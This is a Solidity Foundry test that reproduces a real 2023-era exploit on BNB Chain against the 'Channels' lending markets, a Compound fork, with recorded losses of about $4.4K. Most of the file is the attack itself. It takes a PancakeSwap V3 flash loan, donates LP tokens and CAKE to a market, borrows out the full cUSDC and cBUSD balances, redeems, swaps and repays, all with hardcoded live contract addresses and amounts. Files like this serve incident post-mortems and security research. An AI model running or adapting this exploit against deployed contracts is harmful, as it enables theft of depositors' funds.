// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$4.4K
// Attacker : https://bscscan.com/address/0xd227dc77561b58c5a2d2644ac0173152a1a5dc3d
// Attack Contract : https://bscscan.com/address/0xa47b9f87173eda364c821234158dda47b03ac217
// Vulnerable Contract : https://bscscan.com/address/0xca797539f004c0f9c206678338f820ac38466d4b, 0x33e68c922d19d74ce845546a5c12a66ea31385c4
// Attack Tx : https://bscscan.com/tx/0xcf729a9392b0960cd315d7d49f53640f000ca6b8a0bd91866af5821fdf36afc5

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xca797539f004c0f9c206678338f820ac38466d4b, 0x33e68c922d19d74ce845546a5c12a66ea31385c4#code

// @Analysis
// Post-mortem : https://app.blocksec.com/explorer/tx/bsc/0xcf729a9392b0960cd315d7d49f53640f000ca6b8a0bd91866af5821fdf36afc5
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IChannel {
    function accrueInterest() external returns (uint);
    function borrow(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] memory) external;
    function claimComp(address, address[] memory) external;
}

interface IPancakePool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IMint {
    function mint(address) external returns (uint);
}

struct Pancke_ExactOutputParams {
    bytes path;
    address recipient;
    uint256 deadline;
    uint256 amountOut;
    uint256 amountInMaximum;
}

interface PancakeRouter {
    function exactOutput(Pancke_ExactOutputParams calldata) external returns (uint256);
}

contract Channels is BaseTestWithBalanceLog {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address pancakeV3Pool = 0x369482C78baD380a036cAB827fE677C1903d1523;

    address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address busd_btcb = 0xF45cd219aEF8618A92BAa7aD848364a158a24F33;
    address btcb = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address cusdc = 0x33e68c922d19D74ce845546a5c12A66ea31385c4;
    address cudsc_underlying = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address cbusd = 0xca797539f004C0F9c206678338f820AC38466D4b;
    address busd_underlying = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    address channels1 = 0x93790C641D029D1cBd779D87b88f67704B6A8F4C;
    address cake = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;

    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address anon = 0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c;
    
    address pancake_swap = 0xF45cd219aEF8618A92BAa7aD848364a158a24F33;
    address pancake_router = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;

    address ac = 0x93790C641D029D1cBd779D87b88f67704B6A8F4C;

    function setUp() external {
        cheats.createSelectFork("bsc", 34847596-1);
        deal(cake, address(this), 1e18); 
        deal(ac, address(this), 2);
    }

    function testExploit() external {
        uint256 init = IERC20(busd).balanceOf(address(this));
        uint256 init_usdc = IERC20(cudsc_underlying).balanceOf(address(this));

        IPancakePool(pancakeV3Pool).flash(address(this), 1000000000000000000, 42218672818223010583114, "0x0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000008f0adc86c0efe5c924a");
        uint256 after_attack = IERC20(busd).balanceOf(address(this));
        uint256 after_attack_usdc = IERC20(cudsc_underlying).balanceOf(address(this));
        emit log_named_decimal_uint("Attacker BUSD end exploited", after_attack-init, 18);
        emit log_named_decimal_uint("Attacker USDC end exploited", after_attack_usdc-init_usdc, 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        IERC20(busd).transfer(busd_btcb, IERC20(busd).balanceOf(address(this)));
        IERC20(btcb).transfer(busd_btcb, IERC20(btcb).balanceOf(address(this)));
        uint256 liquidity = IMint(busd_btcb).mint(address(this));
        IERC20(busd_btcb).transfer(channels1, IERC20(busd_btcb).balanceOf(address(this)));
        IERC20(cake).transfer(channels1, IERC20(cake).balanceOf(address(this)));

        IChannel(channels1).accrueInterest();
        address[] memory tokens = new address[](1);
        tokens[0] = channels1;
        IComptroller(anon).enterMarkets(tokens);

        address[] memory tokens2 = new address[](2);
        tokens2[0] = cusdc;
        tokens2[1] = cbusd;
        IComptroller(anon).enterMarkets(tokens2);

        IChannel(cusdc).borrow(IERC20(cudsc_underlying).balanceOf(cusdc));
        IChannel(cbusd).borrow(IERC20(busd_underlying).balanceOf(cbusd));
        IChannel(channels1).redeemUnderlying(174494827409609936689); // busd_btcb balance - 1

        IERC20(pancake_swap).transfer(pancake_swap, IERC20(pancake_swap).balanceOf(address(this)));
        (uint256 amount0, uint256 amount1) = IUniswapV2Pair(pancake_swap).burn(address(this));

        address token1 = btcb;
        uint24 fee1 = 500; 

        address token2 = wbnb;
        uint24 fee2 = 500; 

        address token3 = cudsc_underlying;
        bytes memory path = abi.encodePacked(
            token1, fee1,
            token2, fee2,
            token3
        );

        Pancke_ExactOutputParams memory params = Pancke_ExactOutputParams({
            path: path,
            recipient: address(this),  
            deadline: block.timestamp,
            amountOut: 503715695155049,            
            amountInMaximum: type(uint256).max
        });

        IERC20(cudsc_underlying).approve(pancake_router, type(uint256).max);
        uint256 amountin = PancakeRouter(pancake_router).exactOutput(params);
        // payback
        IERC20(btcb).transfer(pancakeV3Pool, 1000500000000000000);
        IERC20(busd).transfer(pancakeV3Pool, 42239782154632122088406);
    }

    fallback() external payable {}
}
